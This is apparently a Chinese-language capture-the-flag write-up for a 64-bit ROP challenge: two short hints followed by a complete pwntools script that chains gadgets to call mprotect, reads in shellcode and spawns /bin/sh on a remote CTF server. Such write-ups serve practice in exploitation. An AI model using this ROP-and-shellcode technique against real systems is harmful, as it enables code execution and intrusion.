
### level4.1-ropx
##### 思路：大体思路和level13相同，考察点是怎样找gadget
##### 提示：
1. `ROPgadget --binary level4.1-rop_x64 ` 可以获得所有可用gadget
2. syscall之后，下一条指令地址会存在rcx

##### 有了提示1、2，感觉能比较容易地完成这道题

```python
from pwn import *
context.log_level="debug"
pwn_file="./level4.1-rop_x64"
elf=ELF(pwn_file)
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",23004)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

pop_rdi= 0x00000000004001b9 # pop rdi ; mov rbx, qword ptr [rdx] ; ret
pop_rdx= 0x00000000004001a5 # pop rdx ; add rcx, qword ptr [rsi] ; ret
pop_rsi= 0x00000000004001c2 # pop rsi ; add rcx, qword ptr [rcx] ; ret
write = 0x40013D   #  mov     eax, 1; syscall
read =  0x400130
syscall = 0x40019b
bug_func= 0x400157
mprotect_num = 0x0a

rop0 = ['a'*0x10, p64(syscall),p64(pop_rsi) ,p64(0x400068),p64(syscall),p64(pop_rdx),p64(0x400800),p64(pop_rdi) ,p64(1),p64(pop_rdx), p64(mprotect_num), p64(write),
       p64(pop_rdx),p64(0x400800),p64(pop_rdi),p64(0x400000),p64(pop_rdx),p64(7),p64(pop_rsi),p64(0x1000),p64(syscall),p64(bug_func)]

payload0 = ''.join(rop0)

rop1 = ['a'*0x10, p64(syscall), p64(pop_rsi), p64(0x400500),p64(pop_rdx),p64(0x400000),p64(pop_rdi),p64(0x0),p64(pop_rdx),p64(0x80),p64(read),p64(0x400500)]
payload1 = ''.join(rop1)

shellcode="""
   call here
   .ascii "/bin/sh"
   .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx, rdx
   mov rax,0x3b
   syscall
"""

sh = asm(shellcode,arch="amd64")
r.recvuntil("ROP like a 64-bit PRO:")
r.send(payload0+'a'*(0x100-len(payload0)))
r.recvuntil("Good Luck!\n")
r.send(payload1+'a'*(0x100-len(payload1)))
r.sendline(sh)
r.interactive()
```
